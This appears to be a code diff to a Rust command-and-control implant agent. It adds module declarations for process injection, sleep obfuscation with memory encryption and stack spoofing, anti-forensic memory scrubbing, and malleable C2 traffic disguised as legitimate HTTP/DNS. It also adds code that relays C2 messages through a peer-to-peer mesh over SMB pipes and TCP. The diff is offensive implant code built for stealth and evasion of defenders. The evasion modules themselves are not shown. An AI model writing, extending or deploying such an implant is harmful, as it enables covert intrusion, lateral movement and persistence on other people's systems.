@@ -45,6 +45,27 @@ pub mod memory_guard;
 #[path = "memory_guard_stub.rs"]
 pub mod memory_guard;
 
+pub mod p2p;
+
+// Unified injection framework (Windows-only, wraps existing injection module).
+#[cfg(windows)]
+pub mod injection_engine;
+
+// Advanced sleep obfuscation with full memory encryption, stack spoofing,
+// and anti-forensics.  Replaces the Ekko-style sleep on Windows.
+#[cfg(windows)]
+pub mod sleep_obfuscation;
+
+// Continuous memory hygiene: PEB scrubbing, thread start address sanitization,
+// handle table cleanup, and periodic re-verification.  Works alongside the
+// sleep obfuscation system to reduce forensic visibility.
+#[cfg(windows)]
+pub mod memory_hygiene;
+
+// Malleable C2 profile parser — defines how the agent shapes its C2 traffic
+// (HTTP/DNS) to blend in with legitimate network activity.  Platform-agnostic.
+pub mod malleable;
+
 use anyhow::Result;
 use common::{CryptoSession, Message, Transport};
 use log::{error, info, warn};
@@ -75,6 +96,10 @@ pub struct Agent {
     /// runtime. Derived from the `module_aes_key` in `agent.toml`, or
     /// a zero key when not configured (development only).
     crypto: Arc<CryptoSession>,
+    /// P2P mesh state. Populated when the agent accepts child connections
+    /// (via SMB named-pipe listener or TCP P2P relay). An empty/default
+    /// mesh means the agent has no children.
+    p2p_mesh: Arc<tokio::sync::Mutex<p2p::P2pMesh>>,
 }
 
 impl Agent {
@@ -146,6 +171,7 @@ impl Agent {
             transport: Arc::new(Mutex::new(transport)),
             config: Arc::new(RwLock::new(cfg)),
             crypto,
+            p2p_mesh: Arc::new(tokio::sync::Mutex::new(p2p::P2pMesh::default())),
         })
     }
 
@@ -394,6 +420,40 @@ impl Agent {
         let (outbound_tx, mut outbound_rx) =
             tokio::sync::mpsc::channel::<Message>(OUTBOUND_CHANNEL_CAPACITY);
 
+        // Spawn the P2P heartbeat and dead-link detection background task.
+        // This is a no-op when the mesh has no links; it sends heartbeats
+        // to connected links and detects dead ones.
+        #[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
+        {
+            let mesh = self.p2p_mesh.clone();
+            let out_tx = outbound_tx.clone();
+            let _hb_handle = p2p::spawn_heartbeat_task(
+                mesh,
+                out_tx,
+                std::time::Duration::from_secs(30),
+            );
+            info!("P2P heartbeat background task spawned (interval=30s)");
+        }
+
+        // Internal channel for P2P parent-link C2 messages.  The parent
+        // reader task (spawned when a parent link is established) sends
+        // decrypted Messages through this channel.  The main loop reads
+        // them alongside the C2 transport.
+        //
+        // Always created so the select! branch compiles unconditionally;
+        // when no P2P transport feature is enabled the sender is never
+        // stored in the mesh and the channel stays empty.
+        let (p2p_inbound_tx, mut p2p_inbound_rx) =
+            tokio::sync::mpsc::channel::<Message>(OUTBOUND_CHANNEL_CAPACITY);
+
+        // Wire the inbound sender into the mesh so `connect_to_parent`
+        // can pass it to `spawn_parent_reader`.
+        #[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
+        {
+            let mut mesh = self.p2p_mesh.lock().await;
+            mesh.inbound_tx = Some(p2p_inbound_tx);
+        }
+
         loop {
             // Drain any pending outbound messages before we block on recv().
             // This ensures responses from the previous iteration are flushed
@@ -426,6 +486,17 @@ impl Agent {
                     }
                     continue;
                 }
+                // P2P parent-link messages: decrypted C2 data from the
+                // parent agent, injected via `spawn_parent_reader`.
+                p2p_msg = p2p_inbound_rx.recv() => {
+                    match p2p_msg {
+                        Some(msg) => Ok(msg),
+                        None => {
+                            warn!("P2P inbound channel closed");
+                            continue;
+                        }
+                    }
+                }
                 _ = crate::handlers::SHUTDOWN_NOTIFY.notified() => {
                     info!("Shutdown signal received, draining tasks and shutting down.");
                     #[cfg(all(windows, feature = "stealth"))]
@@ -445,6 +516,7 @@ impl Agent {
                     let config_handle = self.config.clone();
                     let command_for_sync = command.clone();
                     let out_tx = outbound_tx.clone();
+                    let p2p_mesh = self.p2p_mesh.clone();
                     tasks.spawn(async move {
                         let config = Arc::new(Mutex::new(config_handle.read().await.clone()));
                         let (response, result_data, audit_event) = handlers::handle_command(
@@ -452,6 +524,8 @@ impl Agent {
                             config.clone(),
                             command,
                             operator_id.as_deref().unwrap_or("admin"),
+                            out_tx.clone(),
+                            p2p_mesh,
                         )
                         .await;
 
@@ -518,6 +592,54 @@ impl Agent {
                             warn!("Outbound channel closed, dropping ModulePush audit: {}", e);
                         }
                     });
+                }
+                Ok(Message::ModuleResponse {
+                    module_id,
+                    encrypted_blob,
+                }) => {
+                    // Complete the pending oneshot so the DownloadModule
+                    // handler can proceed with loading the module.
+                    if let Some(sender) =
+                        handlers::PENDING_MODULE_REQUESTS.lock().unwrap().remove(&module_id)
+                    {
+                        let _ = sender.send(encrypted_blob);
+                    } else {
+                        warn!("Received ModuleResponse for unknown module_id '{}'", module_id);
+                    }
+                }
+                Ok(Message::P2pToChild { child_link_id, data }) => {
+                    // Server → child: re-encrypt with child's per-link key
+                    // and send as DataForward P2P frame.
+                    #[cfg(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp"))]
+                    {
+                        info!(
+                            "P2pToChild received: forwarding {} bytes to child link {:#010X}",
+                            data.len(),
+                            child_link_id
+                        );
+                        let mesh_arc = self.p2p_mesh.clone();
+                        let mut mesh = mesh_arc.lock().await;
+                        match p2p::forward_to_child(&mut mesh, child_link_id, &data).await {
+                            Ok(()) => {
+                                log::debug!(
+                                    "P2P data forwarded to child {:#010X} ({} bytes)",
+                                    child_link_id,
+                                    data.len()
+                                );
+                            }
+                            Err(e) => {
+                                error!(
+                                    "P2P forward_to_child failed for link {:#010X}: {}",
+                                    child_link_id, e
+                                );
+                            }
+                        }
+                    }
+                    #[cfg(not(any(all(windows, feature = "smb-pipe-transport"), feature = "p2p-tcp")))]
+                    {
+                        let _ = (child_link_id, data);
+                        warn!("P2pToChild received but no P2P transport feature enabled");
+                    }
                 }
                 Ok(_) => {} // ignore heartbeats etc.
                 Err(e) => {
